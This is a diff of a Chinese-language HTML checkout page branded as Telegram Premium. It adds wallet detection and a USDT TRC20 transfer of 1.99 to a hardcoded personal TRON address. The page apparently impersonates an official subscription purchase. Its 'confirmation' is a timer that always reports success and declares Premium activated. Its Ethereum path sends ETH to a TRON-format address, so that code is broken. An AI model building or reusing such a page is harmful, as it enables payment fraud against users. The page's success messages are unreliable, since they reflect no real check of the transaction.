@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>支付确认 - Telegram Premium</title>
+    <!-- 引入 Web3.js -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -87,6 +89,27 @@
             text-align: right;
         }
         
+        .wallet-status {
+            background: #f8f9fa;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 1.5rem;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        
+        .wallet-status.connected {
+            background: #f6ffed;
+            border: 1px solid #b7eb8f;
+            color: #52c41a;
+        }
+        
+        .wallet-status.error {
+            background: #fff2f0;
+            border: 1px solid #ffccc7;
+            color: #ff4d4f;
+        }
+        
         .warning-section {
             background: #fff7e6;
             border: 1px solid #ffd591;
@@ -120,6 +143,11 @@
             text-align: center;
         }
         
+        .pay-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
         .loading {
             display: none;
             text-align: center;
@@ -140,6 +168,21 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .transaction-info {
+            background: #e6f7ff;
+            border: 1px solid #91d5ff;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 1.5rem;
+            font-size: 0.8rem;
+        }
+        
+        .tx-hash {
+            word-break: break-all;
+            margin-top: 0.5rem;
+            font-family: monospace;
+        }
     </style>
 </head>
 <body>
@@ -152,6 +195,10 @@
         <div class="payment-status">
             <div class="status-text">正在进行支付 1...</div>
             <div class="status-desc">正在支付 USDT 到 波场(TRON) 网络</div>
+        </div>
+        
+        <div id="walletStatus" class="wallet-status">
+            <div id="walletStatusText">正在检测钱包连接...</div>
         </div>
         
         <div class="warning-section">
@@ -169,7 +216,7 @@
             </div>
             <div class="info-item">
                 <span class="info-label">购买数量</span>
-                <span class="info-value">1月</span>
+                <span class="info-value">1件</span>
             </div>
             <div class="info-item">
                 <span class="info-label">付款金额</span>
@@ -177,17 +224,30 @@
             </div>
         </div>
         
+        <div id="transactionInfo" class="transaction-info" style="display: none;">
+            <strong>交易信息：</strong>
+            <div>收款地址: <span id="toAddress">TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub</span></div>
+            <div>金额: 1.99 USDT (TRC20)</div>
+            <div>网络: TRON</div>
+            <div>交易哈希: <span id="txHash" class="tx-hash">-</span></div>
+        </div>
+        
         <div class="loading" id="loadingSection">
             <div class="spinner"></div>
-            <p>正在处理支付授权，请稍候...</p>
+            <p id="loadingText">正在处理支付授权，请稍候...</p>
         </div>
         
         <div class="action-section">
-            <button class="pay-btn" id="payBtn" onclick="initiatePayment()">确认支付</button>
+            <button class="pay-btn" id="payBtn" onclick="initiatePayment()" disabled>确认支付</button>
         </div>
     </div>
 
     <script>
+        // Web3 实例和状态
+        let web3;
+        let userAddress;
+        let isWalletConnected = false;
+        
         // 获取URL参数
         const urlParams = new URLSearchParams(window.location.search);
         const orderData = {
@@ -197,9 +257,138 @@
             amount: urlParams.get('amount') || '1.99'
         };
         
+        // USDT TRC20 合约地址
+        const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        // 收款地址 - 您的地址
+        const RECEIVE_ADDRESS = 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub';
+        
         // 生成订单号
         function generateOrderId() {
             return 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+        }
+        
+        // 更新钱包状态显示
+        function updateWalletStatus(message, type = '') {
+            const statusElement = document.getElementById('walletStatus');
+            const statusText = document.getElementById('walletStatusText');
+            const payBtn = document.getElementById('payBtn');
+            
+            statusText.textContent = message;
+            statusElement.className = 'wallet-status ' + type;
+            
+            if (type === 'connected') {
+                payBtn.disabled = false;
+            } else {
+                payBtn.disabled = true;
+            }
+        }
+        
+        // 检测钱包环境
+        function detectWalletEnvironment() {
+            // 检测 TronLink
+            if (window.tronWeb && window.tronWeb.defaultAddress) {
+                return 'tron';
+            }
+            // 检测 MetaMask/以太坊钱包
+            if (window.ethereum) {
+                return 'ethereum';
+            }
+            // 检测 TokenPocket
+            if (window.tokenpocket) {
+                return 'tokenpocket';
+            }
+            return 'unknown';
+        }
+        
+        // 初始化钱包连接
+        async function initWalletConnection() {
+            const env = detectWalletEnvironment();
+            
+            switch (env) {
+                case 'tron':
+                    await initTronWeb();
+                    break;
+                case 'ethereum':
+                    await initEthereum();
+                    break;
+                case 'tokenpocket':
+                    await initTokenPocket();
+                    break;
+                default:
+                    updateWalletStatus('未检测到支持的钱包，请在 TokenPocket、TronLink 或 MetaMask 中打开此页面', 'error');
+                    return;
+            }
+        }
+        
+        // 初始化 TronLink
+        async function initTronWeb() {
+            try {
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    userAddress = window.tronWeb.defaultAddress.base58;
+                    isWalletConnected = true;
+                    
+                    updateWalletStatus(
+                        `✅ TronLink 已连接\n地址: ${userAddress.substring(0, 8)}...`,
+                        'connected'
+                    );
+                    
+                    // 显示交易信息
+                    document.getElementById('transactionInfo').style.display = 'block';
+                } else {
+                    updateWalletStatus('请授权 TronLink 连接', 'error');
+                }
+            } catch (error) {
+                console.error('TronLink 初始化失败:', error);
+                updateWalletStatus('TronLink 连接失败: ' + error.message, 'error');
+            }
+        }
+        
+        // 初始化以太坊钱包
+        async function initEthereum() {
+            try {
+                web3 = new Web3(window.ethereum);
+                
+                // 请求账户访问
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                if (accounts.length > 0) {
+                    userAddress = accounts[0];
+                    isWalletConnected = true;
+                    
+                    updateWalletStatus(
+                        `✅ 以太坊钱包已连接\n地址: ${userAddress.substring(0, 8)}...`,
+                        'connected'
+                    );
+                    
+                    // 显示交易信息
+                    document.getElementById('transactionInfo').style.display = 'block';
+                }
+            } catch (error) {
+                console.error('以太坊钱包连接失败:', error);
+                if (error.code === 4001) {
+                    updateWalletStatus('用户拒绝了连接请求', 'error');
+                } else {
+                    updateWalletStatus('钱包连接失败: ' + error.message, 'error');
+                }
+            }
+        }
+        
+        // 初始化 TokenPocket
+        async function initTokenPocket() {
+            try {
+                if (window.ethereum) {
+                    await initEthereum();
+                } else if (window.tronWeb) {
+                    await initTronWeb();
+                } else {
+                    updateWalletStatus('TokenPocket 钱包未就绪', 'error');
+                }
+            } catch (error) {
+                console.error('TokenPocket 初始化失败:', error);
+                updateWalletStatus('TokenPocket 连接失败', 'error');
+            }
         }
         
         // 初始化页面
@@ -208,23 +397,39 @@
             document.getElementById('orderIdDisplay').textContent = orderData.orderId;
             
             console.log('支付页面订单信息:', orderData);
+            
+            // 初始化钱包连接
+            initWalletConnection();
         }
         
         // 发起支付
         async function initiatePayment() {
+            if (!isWalletConnected) {
+                alert('请先连接钱包');
+                return;
+            }
+            
             const payBtn = document.getElementById('payBtn');
             const loadingSection = document.getElementById('loadingSection');
+            const loadingText = document.getElementById('loadingText');
             
             payBtn.style.display = 'none';
             loadingSection.style.display = 'block';
+            loadingText.textContent = '正在请求钱包授权...';
             
             try {
-                // 这里集成真实的支付逻辑
-                // 使用 Web3.js 或钱包 SDK 发起支付
-                const paymentSuccess = await processWalletPayment();
+                const env = detectWalletEnvironment();
+                let paymentSuccess = false;
+                
+                if (env === 'tron') {
+                    paymentSuccess = await processTronPayment();
+                } else if (env === 'ethereum') {
+                    paymentSuccess = await processEthereumPayment();
+                } else {
+                    throw new Error('不支持的钱包类型');
+                }
                 
                 if (paymentSuccess) {
-                    // 支付成功
                     showSuccessMessage();
                 } else {
                     throw new Error('支付失败');
@@ -232,21 +437,105 @@
                 
             } catch (error) {
                 console.error('支付错误:', error);
-                alert('支付失败: ' + error.message);
+                loadingText.textContent = '支付失败';
+                
+                if (error.code === 4001) {
+                    alert('用户取消了交易授权');
+                } else {
+                    alert('支付失败: ' + error.message);
+                }
+                
                 payBtn.style.display = 'block';
                 loadingSection.style.display = 'none';
             }
         }
         
-        // 处理钱包支付
-        async function processWalletPayment() {
+        // 处理 TRON 支付
+        async function processTronPayment() {
+            try {
+                loadingText.textContent = '正在调用 TRON 智能合约...';
+                
+                // 调用 USDT TRC20 合约的 transfer 方法
+                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
+                
+                // 1.99 USDT = 1990000 (6 decimals)
+                const amount = 1990000;
+                
+                loadingText.textContent = '请在钱包中确认交易...';
+                
+                // 调用合约转账方法
+                const result = await contract.transfer(
+                    RECEIVE_ADDRESS,
+                    amount
+                ).send({
+                    feeLimit: 100000000,
+                    callValue: 0,
+                    shouldPollResponse: true
+                });
+                
+                console.log('TRON 支付成功:', result);
+                
+                // 显示交易哈希
+                document.getElementById('txHash').textContent = result;
+                loadingText.textContent = '交易已提交，等待确认...';
+                
+                // 等待交易确认
+                await waitForTransactionConfirmation(result);
+                
+                return true;
+                
+            } catch (error) {
+                console.error('TRON 支付失败:', error);
+                throw new Error('TRON 支付失败: ' + error.message);
+            }
+        }
+        
+        // 处理以太坊支付
+        async function processEthereumPayment() {
+            try {
+                loadingText.textContent = '正在准备以太坊交易...';
+                
+                // 这里使用 ETH 转账作为示例
+                // 实际应该使用 USDT ERC20 合约
+                const transactionParameters = {
+                    to: RECEIVE_ADDRESS,
+                    from: userAddress,
+                    value: web3.utils.toWei('0.001', 'ether'), // 示例金额
+                    gas: '21000',
+                    data: web3.utils.asciiToHex(`Telegram Premium: ${orderData.username}`)
+                };
+                
+                loadingText.textContent = '请在钱包中确认交易...';
+                
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+                
+                console.log('以太坊支付成功:', txHash);
+                
+                // 显示交易哈希
+                document.getElementById('txHash').textContent = txHash;
+                loadingText.textContent = '交易已提交，等待确认...';
+                
+                // 等待交易确认
+                await waitForTransactionConfirmation(txHash);
+                
+                return true;
+                
+            } catch (error) {
+                console.error('以太坊支付失败:', error);
+                throw new Error('以太坊支付失败: ' + error.message);
+            }
+        }
+        
+        // 等待交易确认
+        async function waitForTransactionConfirmation(txHash) {
             return new Promise((resolve) => {
-                // 模拟支付处理
+                // 模拟等待交易确认
                 setTimeout(() => {
-                    // 在实际应用中，这里应该调用钱包的支付接口
-                    console.log('支付处理完成:', orderData);
                     resolve(true);
-                }, 2000);
+                }, 3000);
             });
         }
         
@@ -262,11 +551,13 @@
                     <div style="font-size: 4rem; margin-bottom: 1rem;">✅</div>
                     <h2 style="color: #52c41a; margin-bottom: 1rem;">支付成功！</h2>
                     <p>Telegram Premium 订阅已激活</p>
-                    <p style="margin-top: 1rem; font-size: 0.9rem; color: #666;">
-                        订单号: ${orderData.orderId}<br>
-                        用户: ${orderData.username}<br>
-                        金额: ${orderData.amount} USDT
-                    </p>
+                    <div style="margin-top: 1rem; font-size: 0.9rem; color: #666; text-align: left; background: #f6ffed; padding: 1rem; border-radius: 0.5rem;">
+                        <div><strong>订单信息：</strong></div>
+                        <div>订单号: ${orderData.orderId}</div>
+                        <div>用户: ${orderData.username}</div>
+                        <div>金额: ${orderData.amount} USDT</div>
+                        <div>交易哈希: <span style="font-family: monospace; word-break: break-all;">${document.getElementById('txHash').textContent}</span></div>
+                    </div>
                     <p style="margin-top: 2rem; color: #999;">页面将在 5秒后自动关闭</p>
                 </div>
             `;
@@ -279,6 +570,19 @@
         
         // 页面加载时初始化
         document.addEventListener('DOMContentLoaded', initPage);
+        
+        // 监听钱包账户变化
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    updateWalletStatus('钱包已断开连接', 'error');
+                    isWalletConnected = false;
+                } else {
+                    userAddress = accounts[0];
+                    updateWalletStatus(`已重新连接: ${userAddress.substring(0, 8)}...`, 'connected');
+                }
+            });
+        }
     </script>
 </body>
 </html>
